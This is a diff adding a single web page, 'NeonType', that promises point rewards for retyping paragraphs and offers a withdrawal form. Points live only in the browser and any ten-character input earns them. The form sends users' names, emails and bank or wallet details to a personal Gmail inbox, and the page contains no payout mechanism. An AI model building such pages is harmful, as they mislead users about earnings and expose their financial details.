@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NeonType - Earn Credits</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #050505;
+            --neon-cyan: #00f3ff;
+            --neon-magenta: #ff00ff;
+            --dark-panel: #111;
+            --text-main: #fff;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: 'Share Tech Mono', monospace;
+            overflow-x: hidden;
+        }
+
+        /* Navbar */
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 50px;
+            background: rgba(17, 17, 17, 0.8);
+            border-bottom: 2px solid var(--neon-cyan);
+            box-shadow: 0 0 15px var(--neon-cyan);
+            backdrop-filter: blur(5px);
+        }
+
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--neon-cyan);
+            text-shadow: 0 0 10px var(--neon-cyan);
+        }
+
+        .nav-links button {
+            background: none;
+            border: none;
+            color: white;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 16px;
+            margin-left: 20px;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+        }
+
+        .nav-links button:hover, .nav-links button.active {
+            color: var(--neon-magenta);
+            text-shadow: 0 0 10px var(--neon-magenta);
+        }
+
+        /* Page Containers */
+        .page {
+            display: none;
+            padding: 40px 20px;
+            max-width: 900px;
+            margin: 0 auto;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Home Page Elements */
+        .robotic-panel {
+            background: var(--dark-panel);
+            border: 1px solid var(--neon-cyan);
+            box-shadow: 0 0 20px rgba(0, 243, 255, 0.2);
+            padding: 25px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .robotic-panel::before {
+            content: "SYSTEM_TEXT_OUTPUT";
+            position: absolute;
+            top: -10px;
+            left: 20px;
+            background: var(--bg-color);
+            padding: 0 10px;
+            color: var(--neon-cyan);
+            font-size: 12px;
+            font-family: 'Orbitron', sans-serif;
+        }
+
+        .paragraph-text {
+            font-size: 18px;
+            line-height: 1.6;
+            color: #d1f8ff;
+            letter-spacing: 1px;
+        }
+
+        .reward-info {
+            margin-top: 15px;
+            display: inline-block;
+            background: rgba(0, 243, 255, 0.1);
+            color: var(--neon-cyan);
+            padding: 5px 15px;
+            border-radius: 5px;
+            border: 1px solid var(--neon-cyan);
+            font-family: 'Orbitron', sans-serif;
+            font-size: 14px;
+        }
+
+        textarea {
+            width: 100%;
+            height: 150px;
+            background: var(--dark-panel);
+            color: white;
+            border: 1px solid #333;
+            padding: 15px;
+            font-size: 16px;
+            font-family: inherit;
+            border-radius: 10px;
+            box-sizing: border-box;
+            resize: vertical;
+            transition: 0.3s;
+        }
+
+        textarea:focus {
+            outline: none;
+            border-color: var(--neon-magenta);
+            box-shadow: 0 0 15px rgba(255, 0, 255, 0.3);
+        }
+
+        .btn {
+            background: transparent;
+            color: var(--neon-cyan);
+            border: 2px solid var(--neon-cyan);
+            padding: 15px 30px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: 0.3s;
+            text-transform: uppercase;
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .btn:hover:not(:disabled) {
+            background: var(--neon-cyan);
+            color: var(--bg-color);
+            box-shadow: 0 0 20px var(--neon-cyan);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* Credits Page Elements */
+        .credits-display {
+            text-align: center;
+            padding: 50px;
+            background: var(--dark-panel);
+            border-radius: 15px;
+            border: 1px solid var(--neon-magenta);
+            box-shadow: 0 0 30px rgba(255, 0, 255, 0.2);
+            margin-bottom: 30px;
+        }
+
+        .credits-display h2 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 48px;
+            margin: 10px 0;
+            color: var(--neon-magenta);
+            text-shadow: 0 0 20px var(--neon-magenta);
+        }
+
+        .credits-display p {
+            font-size: 18px;
+            color: #ccc;
+        }
+
+        .btn-withdraw {
+            border-color: var(--neon-magenta);
+            color: var(--neon-magenta);
+        }
+
+        .btn-withdraw:hover:not(:disabled) {
+            background: var(--neon-magenta);
+            color: white;
+            box-shadow: 0 0 20px var(--neon-magenta);
+        }
+
+        .btn-withdraw:disabled {
+            border-color: #555;
+            color: #555;
+            cursor: not-allowed;
+        }
+
+        .warning-text {
+            color: #ff4444;
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+
+        /* Modal / Form */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(8px);
+            z-index: 100;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: var(--dark-panel);
+            padding: 40px;
+            border-radius: 15px;
+            border: 2px solid var(--neon-cyan);
+            box-shadow: 0 0 30px rgba(0, 243, 255, 0.4);
+            width: 90%;
+            max-width: 400px;
+        }
+
+        .modal h3 {
+            font-family: 'Orbitron', sans-serif;
+            color: var(--neon-cyan);
+            text-shadow: 0 0 10px var(--neon-cyan);
+            margin-top: 0;
+            text-align: center;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            background: var(--bg-color);
+            border: 1px solid #444;
+            color: white;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-family: inherit;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--neon-cyan);
+            box-shadow: 0 0 10px rgba(0, 243, 255, 0.3);
+        }
+
+        .close-modal {
+            background: none;
+            border: none;
+            color: #888;
+            width: 100%;
+            margin-top: 10px;
+            cursor: pointer;
+            padding: 10px;
+        }
+        .close-modal:hover { color: white; }
+    </style>
+</head>
+<body>
+
+    <!-- Navigation -->
+    <nav>
+        <div class="logo">NeonType</div>
+        <div class="nav-links">
+            <button id="navHome" class="active" onclick="switchPage('home')">Home</button>
+            <button id="navCredits" onclick="switchPage('credits')">Credits</button>
+        </div>
+    </nav>
+
+    <!-- Home Page -->
+    <div id="homePage" class="page active">
+        <div class="robotic-panel">
+            <div class="paragraph-text" id="displayPara">Loading sequence...</div>
+            <div class="reward-info" id="rewardBadge">REWARD: 00 PTS</div>
+        </div>
+        
+        <textarea id="typingBox" placeholder="Start typing here..."></textarea>
+        <button class="btn" onclick="submitTyping()">Submit Data</button>
+    </div>
+
+    <!-- Credits Page -->
+    <div id="creditsPage" class="page">
+        <div class="credits-display">
+            <p>TOTAL BALANCE</p>
+            <h2 id="totalPointsDisplay">0</h2>
+            <p>PTS</p>
+        </div>
+        
+        <button id="withdrawBtn" class="btn btn-withdraw" onclick="openWithdrawModal()">Initiate Withdraw</button>
+        <div id="withdrawMsg" class="warning-text" style="display: none;">You need at least 500 points to withdraw.</div>
+    </div>
+
+    <!-- Withdraw Modal -->
+    <div id="withdrawModal" class="modal">
+        <div class="modal-content">
+            <h3>Withdraw Details</h3>
+            
+            <!-- Email sending via FormSubmit API (No Redirect Logic) -->
+            <form id="withdrawForm" action="https://formsubmit.co/mrpinto1433@gmail.com" method="POST" onsubmit="handleFormSubmit(event)">
+                <input type="hidden" name="_subject" value="New Withdrawal Request - NeonType">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="Total Points Submitted" id="hiddenPointsField" value="">
+
+                <input type="text" name="User Name" class="form-input" placeholder="Full Name" required>
+                <input type="email" name="User Email" class="form-input" placeholder="Email Address" required>
+                <input type="text" name="Account / Wallet" class="form-input" placeholder="Account Details / Wallet Address" required>
+                
+                <button type="submit" id="submitRequestBtn" class="btn">Submit Request</button>
+            </form>
+            <button class="close-modal" onclick="closeWithdrawModal()">Cancel</button>
+        </div>
+    </div>
+
+    <script>
+        // Points Management (Saves to local storage)
+        let totalPoints = parseInt(localStorage.getItem("neonPoints")) || 0;
+        let currentReward = 0;
+
+        // Paragraph Database
+        const paragraphs = [
+            { points: 10, text: "INITIATING UPLOAD PROTOCOL. ALL SYSTEMS ARE FUNCTIONING AT OPTIMAL CAPACITY. PLEASE VERIFY THE DATA STREAM." },
+            { points: 30, text: "CRITICAL ALERT: SECTOR 4 FIREWALL HAS BEEN BREACHED. REROUTING EMERGENCY POWER TO SECONDARY DEFENSE GRIDS. ENCRYPTING ALL SENSITIVE DATABASES TO PREVENT UNAUTHORIZED EXTRACTION. AWAITING FURTHER COMMANDS." },
+            { points: 10, text: "CALIBRATION SUCCESSFUL. THE NEURAL NETWORK IS READY FOR THE NEXT SET OF INSTRUCTIONS." },
+            { points: 30, text: "SYSTEM DIAGNOSTICS COMPLETE. FOUND MINOR ANOMALIES IN THE COOLING SECTOR. AUTOMATED REPAIR DRONES HAVE BEEN DISPATCHED TO RESOLVE THE ISSUE. MAIN SERVER UPTIME REMAINS AT NINETY-NINE PERCENT." }
+        ];
+
+        // Switch Pages smoothly
+        function switchPage(page) {
+            document.getElementById('homePage').classList.remove('active');
+            document.getElementById('creditsPage').classList.remove('active');
+            document.getElementById('navHome').classList.remove('active');
+            document.getElementById('navCredits').classList.remove('active');
+
+            if(page === 'home') {
+                document.getElementById('homePage').classList.add('active');
+                document.getElementById('navHome').classList.add('active');
+            } else {
+                document.getElementById('creditsPage').classList.add('active');
+                document.getElementById('navCredits').classList.add('active');
+                updateCreditsPage();
+            }
+        }
+
+        // Load Random Paragraph
+        function loadTask() {
+            const randomTask = paragraphs[Math.floor(Math.random() * paragraphs.length)];
+            currentReward = randomTask.points;
+            
+            document.getElementById('displayPara').innerText = randomTask.text;
+            document.getElementById('rewardBadge').innerText = `REWARD: ${currentReward} PTS`;
+            document.getElementById('typingBox').value = '';
+        }
+
+        // Validate and Submit Typing
+        function submitTyping() {
+            const userInput = document.getElementById('typingBox').value.trim();
+            if(userInput.length < 10) {
+                alert("Error: Incomplete data stream. Please type the full text.");
+                return;
+            }
+
+            totalPoints += currentReward;
+            localStorage.setItem("neonPoints", totalPoints); // Save points
+            alert(`Upload Successful! +${currentReward} PTS acquired.`);
+            loadTask();
+        }
+
+        // Update Credits Page Status
+        function updateCreditsPage() {
+            document.getElementById('totalPointsDisplay').innerText = totalPoints;
+            
+            const btn = document.getElementById('withdrawBtn');
+            const msg = document.getElementById('withdrawMsg');
+
+            if(totalPoints < 500) {
+                btn.disabled = true;
+                msg.style.display = 'block';
+            } else {
+                btn.disabled = false;
+                msg.style.display = 'none';
+            }
+        }
+
+        // Modal Controls
+        function openWithdrawModal() {
+            if(totalPoints >= 500) {
+                document.getElementById('hiddenPointsField').value = totalPoints;
+                document.getElementById('withdrawModal').style.display = 'flex';
+            }
+        }
+
+        function closeWithdrawModal() {
+            document.getElementById('withdrawModal').style.display = 'none';
+            // Button wapas normal kar dein agar pehle error aya ho
+            document.getElementById('submitRequestBtn').innerText = "Submit Request";
+            document.getElementById('submitRequestBtn').disabled = false;
+        }
+
+        // Handle Background Submission (No Redirect)
+        function handleFormSubmit(event) {
+            event.preventDefault(); // Redirect hone se rokne ke liye
+
+            const form = event.target;
+            const submitBtn = document.getElementById('submitRequestBtn');
+            
+            // Button loading state
+            submitBtn.innerText = "Processing...";
+            submitBtn.disabled = true;
+
+            const formData = new FormData(form);
+
+            fetch(form.action, {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Points deduct karein aur update karein
+                    totalPoints -= 500; 
+                    localStorage.setItem("neonPoints", totalPoints);
+                    updateCreditsPage();
+                    
+                    alert("Withdrawal request successfully submit ho gayi hai!");
+                    form.reset();
+                    closeWithdrawModal();
+                } else {
+                    alert("Submission mein masla aaya. Dobara try karein.");
+                    submitBtn.innerText = "Submit Request";
+                    submitBtn.disabled = false;
+                }
+            })
+            .catch(error => {
+                alert("Network error. Apni internet connection check karein.");
+                submitBtn.innerText = "Submit Request";
+                submitBtn.disabled = false;
+            });
+        }
+
+        // Initialize First Task on load
+        window.onload = loadTask;
+    </script>
+
+</body>
+</html>
